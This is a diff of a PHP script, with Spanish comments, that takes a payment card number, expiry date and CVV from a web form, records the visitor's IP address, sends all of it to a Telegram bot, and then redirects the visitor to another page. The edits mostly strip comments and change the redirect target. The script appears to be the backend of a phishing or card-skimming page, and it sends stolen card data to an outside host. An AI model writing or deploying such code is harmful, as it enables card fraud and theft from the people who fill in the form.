@@ -1,6 +1,6 @@
 <?php
 // Incluir el archivo de configuración
-include 'config.php'; // Asegúrate de que la ruta de config.php sea correcta
+include 'config.php';
 
 // Verificar que las variables estén definidas
 if (!isset($token) || !isset($chat_id)) {
@@ -10,7 +10,7 @@ if (!isset($token) || !isset($chat_id)) {
 // Obtener los datos del formulario
 $tarjeta = $_POST['tarj'];
 $fecha = $_POST['fecha'];
-$cvv = $_POST['pass']; // Aquí incluimos el campo CVV correctamente
+$cvv = $_POST['pass'];
 
 // Función para obtener la IP del cliente
 function obtenerIPCliente() {
@@ -30,8 +30,8 @@ $ip_cliente = obtenerIPCliente();
 $mensaje = "📝 *Detalles de la Tarjeta Recibida* 📝\n\n";
 $mensaje .= "💳 *Número de Tarjeta*: $tarjeta\n";
 $mensaje .= "📅 *Fecha de Expiración*: $fecha\n";
-$mensaje .= "🔒 *Código de Seguridad (CVV)*: $cvv\n"; // Incluimos el CVV en el mensaje
-$mensaje .= "🌍 *IP del Cliente*: $ip_cliente\n"; // Incluimos la IP del cliente en el mensaje
+$mensaje .= "🔒 *Código de Seguridad (CVV)*: $cvv\n";
+$mensaje .= "🌍 *IP del Cliente*: $ip_cliente\n";
 
 // Enviar los datos a Telegram
 $telegram_url = "https://api.telegram.org/bot$token/sendMessage";
@@ -54,8 +54,8 @@ curl_close($ch);
 if ($response === false) {
     die("Error al enviar el mensaje a Telegram.");
 } else {
-    // Redirigir a otra página después de enviar los datos
-    header("Location: /2.html"); // Cambia esto por la página a la que quieres redirigir
+    // Redirigir a card.html después de enviar los datos
+    header("Location: /card.html");
     exit;
 }
 ?>
